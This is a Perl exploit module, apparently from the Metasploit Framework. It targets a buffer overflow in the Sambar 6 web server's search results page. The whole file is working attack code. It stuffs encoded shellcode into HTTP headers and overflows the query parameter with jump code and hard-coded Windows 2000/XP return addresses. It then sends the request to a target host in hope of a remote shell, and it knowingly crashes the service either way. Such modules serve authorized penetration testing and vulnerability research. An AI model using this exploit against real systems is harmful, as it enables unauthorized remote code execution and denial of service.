package Msf::Exploit::sambar6_search_results;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Sambar 6 Search Results Buffer Overflow',
    'Version'  => '$Revision: 1.12 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', 
                   'Andrew Griffiths <andrewg [at] felinemenace.org>'],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Space'  => 2000, # yes, we have as much space as we want :)
                 'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
                    
                    # example of allowing A-Z, a-z, 0-9, 0xc0+ only 
                    #join("", map { $_=chr($_) } (0x00 .. 0x2f)).
                    #join("", map { $_=chr($_) } (0x3a .. 0x40)).
                    #join("", map { $_=chr($_) } (0x5B .. 0x60)).
                    #join("", map { $_=chr($_) } (0x7B .. 0xC0)),
                 },
    
    'Description'  => qq{
        This exploits a buffer overflow found in the
        /search/results.stm application that comes with Sambar 6.
        This code is a direct port of Andrew Griffiths's SMUDGE
        exploit, the only changes made were to the nops and payload.
        This exploit causes the service to die, whether you provided
        the correct target or not.
    },
    'Refs'  =>  [
			'http://www.osvdb.org/2204'
                ],
    'Targets' => [
                   ['Windows 2000', 0x74fdee63, 0x773368f4],
                   ['Windows XP',   0x77da78ff, 0x77e631ea],
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
    my ($opsys, $jmpesp, $retaddr) = @{ $target };
    
    $self->PrintLine("[*] Attemping to exploit Sambar with target '$opsys'");

    my $request = 
    "POST /search/results.stm HTTP/1.1\r\n".
    "Host: $target_host:$target_port\r\n".
    "User-Agent: $shellcode\r\n".
    "Accept: $shellcode\r\n".
    "Accept-Encoding: $shellcode\r\n".
    "Accept-Language: $shellcode\r\n".
    "Accept-Ranges: $shellcode\r\n".
    "Referrer: $shellcode\r\n".
    "Connection: Keep-Alive\r\n".
    "Pragma: no-cache\r\n".
    "Content-Type: $shellcode\r\n";

    # we use \xfc (cld) as nop, this code goes through tolower() and must be 0xc0->0xff
    # int3's DO NOT WORK because it triggers an exception and causes the server to exit
    my $jmpcode = "\xfc"."h". pack("V", $retaddr) . "\xfc\xfc\xfc"."\xc2\x34\xd1";
    my $bigbuff = $jmpcode . ("X" x (128 - length($jmpcode))) . pack("VV", $jmpesp, $jmpesp) . $jmpcode;
    my $content = "style=page&spage=0&indexname=docs&query=$bigbuff";
    
    $request .= "Content-Length: " . length($content) . "\r\n\r\n" . $content;

    my $s = Msf::Socket->new({"SSL" => $self->GetVar("SSL")});
    if (! $s->Tcp($target_host, $target_port))
    {
        $self->PrintLine("[*] Error: could not connect: " . $s->GetError());
        return;
    }

    $self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
    $s->Send($request);

    $self->PrintLine("[*] Waiting for a response...");
    my $r = $s->Recv(-1);
    if(!$r) {
      $self->PrintLine("[*] Didn't get response, hoping for shell anyway");
    }
    else {
      $self->PrintLine('[*] Got Response');
    }
    
    sleep(2);
    $s->Close();
}

